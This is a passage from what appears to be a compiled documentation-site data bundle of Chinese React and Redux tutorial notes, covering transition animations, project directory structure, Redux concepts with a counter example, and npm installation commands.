react.component{\n\tconstructor(){\n\t\tsuper(...arguments);\n\t\tthis.state = {\n\t\t\tshow:false,\n\t\t\tlists:['海阔天空','在心里从此有个你','霸王别姬']\n\t\t}\n\t}\n\trender(){\n\t\tvar items = this.state.lists.map((item,index)=>{\n\t\t\treturn <div key={index} onclick={this.handleremove.bind(this,index)}>{item}</div>\n\t\t})\n\t\treturn <div>\n\t\t\t<button onclick={this.handleadd.bind(this)}>切换</button>\n\t\t\t<reactcsstransitiongroup\n\t\t\t\ttransitionname=\"box\"\n\t\t\t\ttransitionentertimeout={500}\n\t\t\t\ttransitionleavetimeout={300}\n\t\t\t>\n\t\t\t\t{items}\n\t\t\t</reactcsstransitiongroup>\n\n\t\t</div>\n\t}\n\thandleadd() {\n\tvar newlists =this.state.lists.concat(['enter some text']);\n\t\tthis.setstate({lists: newlists});\n\t}\n\thandleremove(i) {\n\t\tvar newlists = this.state.lists.slice();\n\t\tnewlists.splice(i, 1);\n\t\tthis.setstate({lists: newlists});\n\t}\n}\n\n\n这样便轻松地实现了新增元素、删除元素的动画。\n\n需要注意的地方是你要为 reactcsstransitiongroup 的子组件提供一个关键key，这个key是为了让react知道你添加了什么以及删除了什么。\n\n> 禁止动画 当你需要禁止动画时只需要设置 transitionenter={false} 或者 transitionleave={false}。",charsets:{cjk:!0}},{title:"React项目目录结构",frontmatter:{},regularPath:"/React/React%E9%A1%B9%E7%9B%AE/06-React%E9%A1%B9%E7%9B%AE%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.html",relativePath:"React/React项目/06-React项目目录结构.md",key:"v-17cfa6e4",path:"/React/React%E9%A1%B9%E7%9B%AE/06-React%E9%A1%B9%E7%9B%AE%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.html",headers:[{level:2,title:"基本目录结构",slug:"基本目录结构",normalizedTitle:"基本目录结构",charIndex:18},{level:3,title:"package.json",slug:"package-json",normalizedTitle:"package.json",charIndex:766},{level:3,title:"项目开发目录结构",slug:"项目开发目录结构",normalizedTitle:"项目开发目录结构",charIndex:1112},{level:3,title:"代码分离",slug:"代码分离",normalizedTitle:"代码分离",charIndex:2648},{level:3,title:"代码分层",slug:"代码分层",normalizedTitle:"代码分层",charIndex:2871}],headersStr:"基本目录结构 package.json 项目开发目录结构 代码分离 代码分层",content:"# React项目目录结构\n\n\n# 基本目录结构\n\n/\n ├── dist/                          # 构建后自动生成\n │\n ├── src/                           # 项目开发目录\n │      ├── components/             # 组件\n │      ├── pages/                  # 页面\n │      └── main.js                 # 项目入口\n │\n ├── config/                        # 工程配置\n │      │\n │      ├── webpack.development.config.js # webpack开发环境配置文件\n │      │\n │      └── webpack.production.config.js  # webpack生产环境配置文件\n │\n ├── test/                          # 测试代码\n │\n ├── docs/                          # 项目文档\n │\n ├── static/                        # 库文件等，不会被webpack的loader处理,手动管理\n │      │\n │      ├── favicon.ico             # 站标\n │      │\n │      └── index.html              # 项目入口\n │\n ├── node_modules/                  # 自动生成 包含生产依赖及开发依赖\n │\n ├── package.json                   # 项目配置文件\n │\n └── README.md                      # 项目说明\n\n\n\n# package.json\n\n任何一个项目都需要该配置文件，基本我们所有的依赖库都保存在该文件中，对于该文件的参数主要有：\n\n参数                作用\ndependencies      开发环境依赖库\ndevDependencies   开发环境依赖库\nscripts           执行脚本，比如通过启动开发环境，启动构建，项目测试等。\nprivate           true ，确保我们安装包是私有的(private)，并且移除 main 入口，防止意外发布你的代码。\n\n\n# 项目开发目录结构\n\n\n /\n  ├── dist/                          # 构建后自动生成\n  │\n  ├── src/                           # 项目开发目录\n  │      │\n  │      ├── actions/                # action目录 (Redux)\n  │      │\n  │      ├── canstants/              # 公共常量目录 (Redux)\n  │      │\n  │      ├── reducers/               # reducer目录 (Redux)\n  │      │\n  │      ├── components/             # 展示组件 通用部分作为组件\n  │      │      ├── Header/\n  │      │      ├── Footer/\n  │      │      └── index.js         # 组件集合\n  │      │\n  │      ├── pages/                  # 容器组件 存放容器列表\n  │      │      ├── Home/\n  │      │      ├── About/\n  │      │      └── index.js         # 页面集合\n  │      │\n  │      ├── router/                 # 路由目录 (route)\n  │      │\n  │      ├── static/                 # 公共静态资源目录 (css、font、images)\n  │      │\n  │      ├── util/                   # 工具目录 (localStorage)\n  │      │\n  │      └── index.jsx               # 整个程序的入口文件\n  │\n  ├── config/                        # 工程配置\n  │      │\n  │      ├── webpack.development.config.js # webpack开发环境配置文件\n  │      │\n  │      └── webpack.production.config.js  # webpack生产环境配置文件\n  │\n  ├── test/                          # 测试代码\n  │\n  ├── docs/                          # 项目文档\n  │\n  ├── static/                        # 库文件等，不会被webpack的loader处理,手动管理\n  │      │\n  │      ├── favicon.ico             # 站标\n  │      │\n  │      └── index.html              # 项目入口\n  │\n  ├── node_modules/                  # 自动生成 包含生产依赖及开发依赖\n  │\n  ├── package.json                   # 项目配置文件\n  │\n  └── README.md                      # 项目说明\n\n\n\n# 代码分离\n\n├── src/                         # 项目开发文件目录\n│      │\n│      ├── components/           # 展示组件 通用部分作为组件\n│      │\n│      ├── pages/                # 容器组件 存放容器列表\n│      │\n│      └── index.jsx             # 整个程序的入口文件\n\n\n\n# 代码分层\n\n# pages\n\n├── src/                         # 项目开发文件目录\n│      │\n│      ├── components/           # 展示组件 通用部分作为组件\n│      │\n│      ├── pages/                # 容器组件(页面组件) 存放页面列表\n│      │      ├── index/         # 首页\n│      │      ├── list/          # 列表\n│      │      ├── category/      # 栏目页\n│      │      ├── login/         # 登录页\n│      │      ├── register/      # 注册页\n│      │      ├── search/        # 搜索页\n│      │      └── index.js       # 页面集合\n│      │\n│      └── index.jsx             # 整个程序的入口文件\n\n\n# page\n\n├── src/                         # 项目开发文件目录\n│      │\n│      ├── components/           # 展示组件 通用部分作为组件\n│      │\n│      ├── pages/                # 容器组件 存放容器列表\n│      │      ├── index/         # 首页\n│      │      │      ├── index.jsx  # 页面入口\n│      │      │      ├── list.jsx\n│      │      │      ├── banner.jsx\n│      │      │      ├── comment.jsx\n│      │      │      ├── index.less\n│      │      │      ├── index.css\n│      │      │      └── images/\n│      │      ├── list/          # 列表\n│      │      ├── category/      # 栏目页\n│      │      ├── login/         # 登录页\n│      │      ├── register/      # 注册页\n│      │      ├── search/        # 搜索页\n│      │      └── index.js       # 页面集合\n│      │\n│      ├── index.jsx             # 整个程序的入口文件\n│      │\n\n\n\n# components\n\n├── src/                         # 项目开发文件目录\n│      │\n│      ├── components/           # 展示组件 通用部分作为组件\n│      │      │\n│      │      ├── Header/        # 头部\n│      │      │      ├── index.jsx     # 组件\n│      │      │      ├── header.less   \n│      │      │      ├── header.css\n│      │      │      └── images/\n│      │      ├── NavBar/\n│      │      │\n│      │      ├── SearchBar/\n│      │      │\n│      │      └── index.js       # 组件集合\n│      │\n│      ├── pages/                # 容器组件 存放容器列表\n│      │\n│      └── index.jsx             # 整个程序的入口文件\n",normalizedContent:"# react项目目录结构\n\n\n# 基本目录结构\n\n/\n ├── dist/                          # 构建后自动生成\n │\n ├── src/                           # 项目开发目录\n │      ├── components/             # 组件\n │      ├── pages/                  # 页面\n │      └── main.js                 # 项目入口\n │\n ├── config/                        # 工程配置\n │      │\n │      ├── webpack.development.config.js # webpack开发环境配置文件\n │      │\n │      └── webpack.production.config.js  # webpack生产环境配置文件\n │\n ├── test/                          # 测试代码\n │\n ├── docs/                          # 项目文档\n │\n ├── static/                        # 库文件等，不会被webpack的loader处理,手动管理\n │      │\n │      ├── favicon.ico             # 站标\n │      │\n │      └── index.html              # 项目入口\n │\n ├── node_modules/                  # 自动生成 包含生产依赖及开发依赖\n │\n ├── package.json                   # 项目配置文件\n │\n └── readme.md                      # 项目说明\n\n\n\n# package.json\n\n任何一个项目都需要该配置文件，基本我们所有的依赖库都保存在该文件中，对于该文件的参数主要有：\n\n参数                作用\ndependencies      开发环境依赖库\ndevdependencies   开发环境依赖库\nscripts           执行脚本，比如通过启动开发环境，启动构建，项目测试等。\nprivate           true ，确保我们安装包是私有的(private)，并且移除 main 入口，防止意外发布你的代码。\n\n\n# 项目开发目录结构\n\n\n /\n  ├── dist/                          # 构建后自动生成\n  │\n  ├── src/                           # 项目开发目录\n  │      │\n  │      ├── actions/                # action目录 (redux)\n  │      │\n  │      ├── canstants/              # 公共常量目录 (redux)\n  │      │\n  │      ├── reducers/               # reducer目录 (redux)\n  │      │\n  │      ├── components/             # 展示组件 通用部分作为组件\n  │      │      ├── header/\n  │      │      ├── footer/\n  │      │      └── index.js         # 组件集合\n  │      │\n  │      ├── pages/                  # 容器组件 存放容器列表\n  │      │      ├── home/\n  │      │      ├── about/\n  │      │      └── index.js         # 页面集合\n  │      │\n  │      ├── router/                 # 路由目录 (route)\n  │      │\n  │      ├── static/                 # 公共静态资源目录 (css、font、images)\n  │      │\n  │      ├── util/                   # 工具目录 (localstorage)\n  │      │\n  │      └── index.jsx               # 整个程序的入口文件\n  │\n  ├── config/                        # 工程配置\n  │      │\n  │      ├── webpack.development.config.js # webpack开发环境配置文件\n  │      │\n  │      └── webpack.production.config.js  # webpack生产环境配置文件\n  │\n  ├── test/                          # 测试代码\n  │\n  ├── docs/                          # 项目文档\n  │\n  ├── static/                        # 库文件等，不会被webpack的loader处理,手动管理\n  │      │\n  │      ├── favicon.ico             # 站标\n  │      │\n  │      └── index.html              # 项目入口\n  │\n  ├── node_modules/                  # 自动生成 包含生产依赖及开发依赖\n  │\n  ├── package.json                   # 项目配置文件\n  │\n  └── readme.md                      # 项目说明\n\n\n\n# 代码分离\n\n├── src/                         # 项目开发文件目录\n│      │\n│      ├── components/           # 展示组件 通用部分作为组件\n│      │\n│      ├── pages/                # 容器组件 存放容器列表\n│      │\n│      └── index.jsx             # 整个程序的入口文件\n\n\n\n# 代码分层\n\n# pages\n\n├── src/                         # 项目开发文件目录\n│      │\n│      ├── components/           # 展示组件 通用部分作为组件\n│      │\n│      ├── pages/                # 容器组件(页面组件) 存放页面列表\n│      │      ├── index/         # 首页\n│      │      ├── list/          # 列表\n│      │      ├── category/      # 栏目页\n│      │      ├── login/         # 登录页\n│      │      ├── register/      # 注册页\n│      │      ├── search/        # 搜索页\n│      │      └── index.js       # 页面集合\n│      │\n│      └── index.jsx             # 整个程序的入口文件\n\n\n# page\n\n├── src/                         # 项目开发文件目录\n│      │\n│      ├── components/           # 展示组件 通用部分作为组件\n│      │\n│      ├── pages/                # 容器组件 存放容器列表\n│      │      ├── index/         # 首页\n│      │      │      ├── index.jsx  # 页面入口\n│      │      │      ├── list.jsx\n│      │      │      ├── banner.jsx\n│      │      │      ├── comment.jsx\n│      │      │      ├── index.less\n│      │      │      ├── index.css\n│      │      │      └── images/\n│      │      ├── list/          # 列表\n│      │      ├── category/      # 栏目页\n│      │      ├── login/         # 登录页\n│      │      ├── register/      # 注册页\n│      │      ├── search/        # 搜索页\n│      │      └── index.js       # 页面集合\n│      │\n│      ├── index.jsx             # 整个程序的入口文件\n│      │\n\n\n\n# components\n\n├── src/                         # 项目开发文件目录\n│      │\n│      ├── components/           # 展示组件 通用部分作为组件\n│      │      │\n│      │      ├── header/        # 头部\n│      │      │      ├── index.jsx     # 组件\n│      │      │      ├── header.less   \n│      │      │      ├── header.css\n│      │      │      └── images/\n│      │      ├── navbar/\n│      │      │\n│      │      ├── searchbar/\n│      │      │\n│      │      └── index.js       # 组件集合\n│      │\n│      ├── pages/                # 容器组件 存放容器列表\n│      │\n│      └── index.jsx             # 整个程序的入口文件\n",charsets:{cjk:!0}},{title:"Redux介绍",frontmatter:{},regularPath:"/React/Redux/02-Redux%E4%BB%8B%E7%BB%8D.html",relativePath:"React/Redux/02-Redux介绍.md",key:"v-1119d962",path:"/React/Redux/02-Redux%E4%BB%8B%E7%BB%8D.html",headers:[{level:2,title:"为什么需要Redux？",slug:"为什么需要redux",normalizedTitle:"为什么需要redux？",charIndex:149},{level:3,title:"为什么需要Redux？",slug:"为什么需要redux-2",normalizedTitle:"为什么需要redux？",charIndex:149},{level:3,title:"什么时候使用Redux？",slug:"什么时候使用redux",normalizedTitle:"什么时候使用redux？",charIndex:212},{level:2,title:"Redux 三大原则",slug:"redux-三大原则",normalizedTitle:"redux 三大原则",charIndex:619},{level:3,title:"1. 单一数据源",slug:"_1-单一数据源",normalizedTitle:"1. 单一数据源",charIndex:667},{level:3,title:"2. 状态是只读的",slug:"_2-状态是只读的",normalizedTitle:"2. 状态是只读的",charIndex:749},{level:3,title:"3. 状态的修改均由纯函数完成",slug:"_3-状态的修改均由纯函数完成",normalizedTitle:"3. 状态的修改均由纯函数完成",charIndex:816},{level:2,title:"基本概念",slug:"基本概念",normalizedTitle:"基本概念",charIndex:882},{level:3,title:"Action",slug:"action",normalizedTitle:"action",charIndex:902},{level:3,title:"Reducer",slug:"reducer",normalizedTitle:"reducer",charIndex:909},{level:3,title:"Store",slug:"store",normalizedTitle:"store",charIndex:917},{level:2,title:"React 与 Redux结合",slug:"react-与-redux结合",normalizedTitle:"react 与 redux结合",charIndex:2280},{level:2,title:"参考",slug:"参考",normalizedTitle:"参考",charIndex:2361}],headersStr:"为什么需要Redux？ 为什么需要Redux？ 什么时候使用Redux？ Redux 三大原则 1. 单一数据源 2. 状态是只读的 3. 状态的修改均由纯函数完成 基本概念 Action Reducer Store React 与 Redux结合 参考",content:"# Redux介绍\n\n> Redux 是 JavaScript 状态容器，提供可预测化的状态管理。\n\nRedux最主要是用作应用状态的管理。\n\n官方网站\n\n名称     地址\n官网     http://redux.js.org\n中文官网   http://cn.redux.js.org\n\n\n# 为什么需要Redux？\n\n> 项目较小，人员较少，数据管理不复杂不需要Redux\n\n\n# 为什么需要Redux？\n\n\n\n\n# 什么时候使用Redux？\n\n\n\n无论是移动端还是 pc 端，当你使用 React 或者 vue 开发组件化的 SPA 程序时，组件之间共享信息是一个非常大的问题。例如，用户登录之后客户端会存储用户信息（如userid、头像等），而系统的很多个组件都会用到这些信息，例如收藏、点赞、评论等。这些组件在用到用户信息时，难道每次使用都重新获取一遍？———— 自然不是这样。因此每个系统都需要一个管理多组件使用的公共信息的功能，这就是 Redux 的作用。\n\n如果你的应用有以下场景，可以考虑使用 Redux:\n\n 1. 不同身份的用户有不同的使用方式（比如普通用户和管理员）\n\n * 与服务器大量交互，或者使用了WebSocket\n * View要从多个来源获取数据\n * 某个组件的状态，需要共享\n * 某个状态需要在任何地方都可以拿到\n * 一个组件需要改变全局状态\n * 一个组件需要改变另一个组件的状态\n\n\n# Redux 三大原则\n\n想要理解Redux，必须要知道Redux设计和使用的三大原则。\n\n\n# 1. 单一数据源\n\n整个应用的 state 被储存在一棵 object tree 中，并且这个 object tree 只存在于唯一一个 store 中。\n\n\n# 2. 状态是只读的\n\n唯一改变 state 的方法就是触发 action，action 是一个用于描述已发生事件的普通对象。\n\n\n# 3. 状态的修改均由纯函数完成\n\n为了描述 action 如何改变 state tree ，你需要编写 reducers。\n\n\n# 基本概念\n\nredux中有三个基本概念，Action，Reducer，Store。\n\n类型        描述\nAction    是个对象，必须包含type这个属性，reducer将根据这个属性值来对store进行相应的处理。除此之外的属性，就是进行这个操作需要的数据。\nReducer   是个函数。接受两个参数：要修改的数据 state 和 action 对象。根据 action.type\n          来决定采用的操作，对state进行修改，最后返回新的state。\nStore     是个对象，贯穿你整个应用的数据都应该存储在这里。\n\n\n# Action\n\n> Action 的任务是描述“发生了什么事情？”\n\nAction 是一个普通对象。redux约定 Action 内使用一个字符串类型的 type 字段来表示将要执行的动作。\n\n{\n  type: 'ADD_ITEM'\n}\n\n\n除了 type 之外，Action可以存放一些其他的想要操作的数据。例如：\n\n{\n  type: 'ADD_ITEM',\n  text: 'Hello King'\n}\n\n\n但在实际应用中，我们需要一个函数来为我们创建Action。这个函数叫做actionCreator。它看起来是这样的：\n\nfunction addItem(text) {\n  return {\n    type: types.ADD_ITEM,\n    text\n  }\n}\n\n\n\n# Reducer\n\n> Reducer 是一个普通的回调函数。它的任务是根据传入的Action对象去修改状态树。\n\n当它被Redux调用的时候会为他传递两个参数State 和 Action。\n\nReducer会根据 Action 的type来对旧的 State 进行操作。返回新的State。\n\n或者简单地讲 Reducer就是一个纯函数，根据传入的 当前state和action,返回一个新state：\n\n(state,action) => newState\n\n\n比如我们这个例子中的Reducer应该是这样的：\n\nconst initialState = {\n\ttext:'hello world'\n}\n\nfunction Reducer(state=initialState,action){\n\tswitch(action.type){\n\t\tcase 'CHANGE_TEXT':\n\t\t\treturn {\n\t\t\t\ttext:'Hello Stark'\n\t\t\t}\n\t\tdefault:\n\t\t\treturn state;\n\t}\n}\n\n\n\n# Store\n\nStore 就是保存数据的地方，你可以把它看成一个容器。整个应用只能有一个 Store。\n\nRedux 提供createStore这个函数，用来生成 Store。\n\n# 创建Store非常简单。createStore 有两个参数，Reducer 和 initialState。\n\nimport {createStore} from 'redux';\nconst store = createStore(rootReducers, initialState);\n\n\nconst store = createStore(fn);\n\n\n> 注意：一个应用只有一个Store。\n\n\n# React 与 Redux结合\n\nRedux是一款状态管理库，并且提供了react-redux库来与React亲密配合，下图对其关系进行很好的展示：\n\n\n\n\n# 参考\n\n名称           地址\nRedux 关系图解   https://segmentfault.com/a/1190000011473973",normalizedContent:"# redux介绍\n\n> redux 是 javascript 状态容器，提供可预测化的状态管理。\n\nredux最主要是用作应用状态的管理。\n\n官方网站\n\n名称     地址\n官网     http://redux.js.org\n中文官网   http://cn.redux.js.org\n\n\n# 为什么需要redux？\n\n> 项目较小，人员较少，数据管理不复杂不需要redux\n\n\n# 为什么需要redux？\n\n\n\n\n# 什么时候使用redux？\n\n\n\n无论是移动端还是 pc 端，当你使用 react 或者 vue 开发组件化的 spa 程序时，组件之间共享信息是一个非常大的问题。例如，用户登录之后客户端会存储用户信息（如userid、头像等），而系统的很多个组件都会用到这些信息，例如收藏、点赞、评论等。这些组件在用到用户信息时，难道每次使用都重新获取一遍？———— 自然不是这样。因此每个系统都需要一个管理多组件使用的公共信息的功能，这就是 redux 的作用。\n\n如果你的应用有以下场景，可以考虑使用 redux:\n\n 1. 不同身份的用户有不同的使用方式（比如普通用户和管理员）\n\n * 与服务器大量交互，或者使用了websocket\n * view要从多个来源获取数据\n * 某个组件的状态，需要共享\n * 某个状态需要在任何地方都可以拿到\n * 一个组件需要改变全局状态\n * 一个组件需要改变另一个组件的状态\n\n\n# redux 三大原则\n\n想要理解redux，必须要知道redux设计和使用的三大原则。\n\n\n# 1. 单一数据源\n\n整个应用的 state 被储存在一棵 object tree 中，并且这个 object tree 只存在于唯一一个 store 中。\n\n\n# 2. 状态是只读的\n\n唯一改变 state 的方法就是触发 action，action 是一个用于描述已发生事件的普通对象。\n\n\n# 3. 状态的修改均由纯函数完成\n\n为了描述 action 如何改变 state tree ，你需要编写 reducers。\n\n\n# 基本概念\n\nredux中有三个基本概念，action，reducer，store。\n\n类型        描述\naction    是个对象，必须包含type这个属性，reducer将根据这个属性值来对store进行相应的处理。除此之外的属性，就是进行这个操作需要的数据。\nreducer   是个函数。接受两个参数：要修改的数据 state 和 action 对象。根据 action.type\n          来决定采用的操作，对state进行修改，最后返回新的state。\nstore     是个对象，贯穿你整个应用的数据都应该存储在这里。\n\n\n# action\n\n> action 的任务是描述“发生了什么事情？”\n\naction 是一个普通对象。redux约定 action 内使用一个字符串类型的 type 字段来表示将要执行的动作。\n\n{\n  type: 'add_item'\n}\n\n\n除了 type 之外，action可以存放一些其他的想要操作的数据。例如：\n\n{\n  type: 'add_item',\n  text: 'hello king'\n}\n\n\n但在实际应用中，我们需要一个函数来为我们创建action。这个函数叫做actioncreator。它看起来是这样的：\n\nfunction additem(text) {\n  return {\n    type: types.add_item,\n    text\n  }\n}\n\n\n\n# reducer\n\n> reducer 是一个普通的回调函数。它的任务是根据传入的action对象去修改状态树。\n\n当它被redux调用的时候会为他传递两个参数state 和 action。\n\nreducer会根据 action 的type来对旧的 state 进行操作。返回新的state。\n\n或者简单地讲 reducer就是一个纯函数，根据传入的 当前state和action,返回一个新state：\n\n(state,action) => newstate\n\n\n比如我们这个例子中的reducer应该是这样的：\n\nconst initialstate = {\n\ttext:'hello world'\n}\n\nfunction reducer(state=initialstate,action){\n\tswitch(action.type){\n\t\tcase 'change_text':\n\t\t\treturn {\n\t\t\t\ttext:'hello stark'\n\t\t\t}\n\t\tdefault:\n\t\t\treturn state;\n\t}\n}\n\n\n\n# store\n\nstore 就是保存数据的地方，你可以把它看成一个容器。整个应用只能有一个 store。\n\nredux 提供createstore这个函数，用来生成 store。\n\n# 创建store非常简单。createstore 有两个参数，reducer 和 initialstate。\n\nimport {createstore} from 'redux';\nconst store = createstore(rootreducers, initialstate);\n\n\nconst store = createstore(fn);\n\n\n> 注意：一个应用只有一个store。\n\n\n# react 与 redux结合\n\nredux是一款状态管理库，并且提供了react-redux库来与react亲密配合，下图对其关系进行很好的展示：\n\n\n\n\n# 参考\n\n名称           地址\nredux 关系图解   https://segmentfault.com/a/1190000011473973",charsets:{cjk:!0}},{title:"Redux使用",frontmatter:{},regularPath:"/React/Redux/04-Redux%E4%BD%BF%E7%94%A8.html",relativePath:"React/Redux/04-Redux使用.md",key:"v-1e3d26ec",path:"/React/Redux/04-Redux%E4%BD%BF%E7%94%A8.html",headers:[{level:2,title:"导入Redux",slug:"导入redux",normalizedTitle:"导入redux",charIndex:159},{level:2,title:"基本使用",slug:"基本使用",normalizedTitle:"基本使用",charIndex:245},{level:3,title:"Action",slug:"action",normalizedTitle:"action",charIndex:180},{level:3,title:"Reducer",slug:"reducer",normalizedTitle:"reducer",charIndex:80},{level:3,title:"Store",slug:"store",normalizedTitle:"store",charIndex:107},{level:3,title:"完整示例",slug:"完整示例",normalizedTitle:"完整示例",charIndex:1782}],headersStr:"导入Redux 基本使用 Action Reducer Store 完整示例",content:'# Redux使用\n\n类别          方法\nredux核心     store, action, reducer\n合并reducer   combineReducers\n创建store     createStore\nstore方法     getState, dispatch, subscribe\n\n\n# 导入Redux\n\nimport {bindActionCreators, combineReducers, createStore} from \'redux\';\n\n\n\n# 基本使用\n\n通过一个示例介绍Redux基本用法：\n\n计数案例：有一个容器显示当前数字，点击+按钮数字+1，点击-按钮数字-1。\n\n\n# Action\n\n> Action 是一个普通对象。redux约定 Action 内使用一个字符串类型的 type 字段来表示将要执行的动作。\n\n# Action对象\n\nAction操作有2个: 加(INCREMENT)，减(DECREMENT)。\n\n{\n    type:"INCREMENT"\n}\n\n{\n    type:"DECREMENT"\n}\n\n\n# Action创建函数(Action Creator)\n\n> Action Creator 是创建一个action的函数，函数返回一个对象。\n\nView 要发送多少种消息，就会有多少种 Action。如果都手写，会很麻烦。可以定义一个函数来生成 Action，这个函数就叫 Action Creator。\n\n//actions.js\nexport const increment = ()=>{\n    return {type:"INCREMENT"};\n}\nexport const decrement = () => {\n    return {type:"DECREMENT"};\n}\n\n\n> increment和decrement 就是 Action Creator。\n\n使用的时候直接store.dispatch(increment());就可以。\n\n\n# Reducer\n\nReducer就是一个纯函数，根据传入的 当前state和action,返回一个新state：\n\n// 数据只是一个数值，默认定义为0:\nconst reducer = (state=0,action)=>{\n    switch(action.type){\n        case "INCREMENT":\n        return state+1;\n        break;\n        case "DECREMENT":\n        return state-1;\n        break;\n        default:\n        return state;\n    }\n}\n\n\n\n# Store\n\nStore 就是保存数据的地方，你可以把它看成一个容器。整个应用只能有一个 Store。\n\nRedux 提供createStore(reducer)这个函数，用来生成 Store。\n\nvar store = createStore(reducer);\n\n\n通过store的getState() 方法获取state:\n\nlet state = store.getState();\nconsole.log(state); //0\n\n\n通过store的dispatch(action)方法生成新的state:\n\nstore.dispatch({type:"INCREMENT"})   //1   0+1\nstore.dispatch({type:"INCREMENT"})   //2   1+1\nstore.dispatch({type:"INCREMENT"})   //3   2+1\nstore.dispatch({type:"DECREMENT"})   //2   3-1\n\n\n通过store的subscribe(listener) 监听state变化:\n\nstore.subscribe(function(){\n    let state = store.getState();\n    console.log(state);\n})\n\n\n\n# 完整示例\n\n//reducer\nconst reducer = (state=0,action)=>{\n    switch(action.type){\n        case "INCREMENT":\n        return state+1;\n        break;\n        case "DECREMENT":\n        return state-1;\n        break;\n        default:\n        return state;\n    }\n}\n\n//store\nvar store = Redux.createStore(reducer);\nstore.subscribe(function(){\n    let state = store.getState();\n    console.log(state);\n})\n\nstore.dispatch({type:"INCREMENT"})   //1   0+1\nstore.dispatch({type:"INCREMENT"})   //2   1+1\nstore.dispatch({type:"INCREMENT"})   //3   2+1\nstore.dispatch({type:"DECREMENT"})   //2   3-1\n',normalizedContent:'# redux使用\n\n类别          方法\nredux核心     store, action, reducer\n合并reducer   combinereducers\n创建store     createstore\nstore方法     getstate, dispatch, subscribe\n\n\n# 导入redux\n\nimport {bindactioncreators, combinereducers, createstore} from \'redux\';\n\n\n\n# 基本使用\n\n通过一个示例介绍redux基本用法：\n\n计数案例：有一个容器显示当前数字，点击+按钮数字+1，点击-按钮数字-1。\n\n\n# action\n\n> action 是一个普通对象。redux约定 action 内使用一个字符串类型的 type 字段来表示将要执行的动作。\n\n# action对象\n\naction操作有2个: 加(increment)，减(decrement)。\n\n{\n    type:"increment"\n}\n\n{\n    type:"decrement"\n}\n\n\n# action创建函数(action creator)\n\n> action creator 是创建一个action的函数，函数返回一个对象。\n\nview 要发送多少种消息，就会有多少种 action。如果都手写，会很麻烦。可以定义一个函数来生成 action，这个函数就叫 action creator。\n\n//actions.js\nexport const increment = ()=>{\n    return {type:"increment"};\n}\nexport const decrement = () => {\n    return {type:"decrement"};\n}\n\n\n> increment和decrement 就是 action creator。\n\n使用的时候直接store.dispatch(increment());就可以。\n\n\n# reducer\n\nreducer就是一个纯函数，根据传入的 当前state和action,返回一个新state：\n\n// 数据只是一个数值，默认定义为0:\nconst reducer = (state=0,action)=>{\n    switch(action.type){\n        case "increment":\n        return state+1;\n        break;\n        case "decrement":\n        return state-1;\n        break;\n        default:\n        return state;\n    }\n}\n\n\n\n# store\n\nstore 就是保存数据的地方，你可以把它看成一个容器。整个应用只能有一个 store。\n\nredux 提供createstore(reducer)这个函数，用来生成 store。\n\nvar store = createstore(reducer);\n\n\n通过store的getstate() 方法获取state:\n\nlet state = store.getstate();\nconsole.log(state); //0\n\n\n通过store的dispatch(action)方法生成新的state:\n\nstore.dispatch({type:"increment"})   //1   0+1\nstore.dispatch({type:"increment"})   //2   1+1\nstore.dispatch({type:"increment"})   //3   2+1\nstore.dispatch({type:"decrement"})   //2   3-1\n\n\n通过store的subscribe(listener) 监听state变化:\n\nstore.subscribe(function(){\n    let state = store.getstate();\n    console.log(state);\n})\n\n\n\n# 完整示例\n\n//reducer\nconst reducer = (state=0,action)=>{\n    switch(action.type){\n        case "increment":\n        return state+1;\n        break;\n        case "decrement":\n        return state-1;\n        break;\n        default:\n        return state;\n    }\n}\n\n//store\nvar store = redux.createstore(reducer);\nstore.subscribe(function(){\n    let state = store.getstate();\n    console.log(state);\n})\n\nstore.dispatch({type:"increment"})   //1   0+1\nstore.dispatch({type:"increment"})   //2   1+1\nstore.dispatch({type:"increment"})   //3   2+1\nstore.dispatch({type:"decrement"})   //2   3-1\n',charsets:{cjk:!0}},{title:"Redux安装",frontmatter:{},regularPath:"/React/Redux/03-Redux%E5%AE%89%E8%A3%85.html",relativePath:"React/Redux/03-Redux安装.md",key:"v-4332dd72",path:"/React/Redux/03-Redux%E5%AE%89%E8%A3%85.html",headers:[{level:3,title:"redux",slug:"redux",normalizedTitle:"redux",charIndex:66},{level:3,title:"react-redux",slug:"react-redux",normalizedTitle:"react-redux",charIndex:119},{level:3,title:"引入",slug:"引入",normalizedTitle:"引入",charIndex:492}],headersStr:"redux react-redux 引入",content:"# Redux安装\n\n名称            版本   安装                               大小\nredux              npm install --save redux         \nreact-redux        npm install --save react-redux   \n\n\n# redux\n\nredux是独立的应用状态管理工具。它是可以独立于react之外的。\n\nnpm install --save redux\n\n\n\n# react-redux\n\n如果我们需要在react当中运用它，那么我们需要手动订阅store的状态变化，来对我们的react组件进行更新。那么react-reudx这个工具：\n\nnpm install --save react-redux\n\n\n我们可以使用Redux 开发者工具。\n\nnpm install --save-dev redux-devtools\n\n\n> 开发者工具：开发者可以用Redux的开发工具去实时追踪、回退和重放程序中action与state的每个变化。\n\n\n# 引入\n\nimport {bindActionCreators, combineReducers, createStore, applyMiddleware} from 'redux';\nimport {Provider, connect} from 'react-redux';\n",normalizedContent:"# redux安装\n\n名称            版本   安装                               大小\nredux              npm install --save redux         \nreact-redux        npm install --save react-redux   \n\n\n# redux\n\nredux是独立的应用状态管理工具。它是可以独立于react之外的。\n\nnpm install --save redux\n\n\n\n# react-redux\n\n如果我们需要在react当中运用它，那么我们需要手动订阅store的状态变化，来对我们的react组件进行更新。那么react-reudx这个工具：\n\nnpm install --save react-redux\n\n\n我们可以使用redux 开发者工具。\n\nnpm install --save-dev redux-devtools\n\n\n> 开发者工具：开发者可以用redux的开发工具去实时追踪、回退和重放程序中action与state的每个变化。\n\n\n# 引入\n\nimport {bindactioncreators, combinereducers, createstore, applymiddleware} from 'redux';\nimport {provider, connect} from 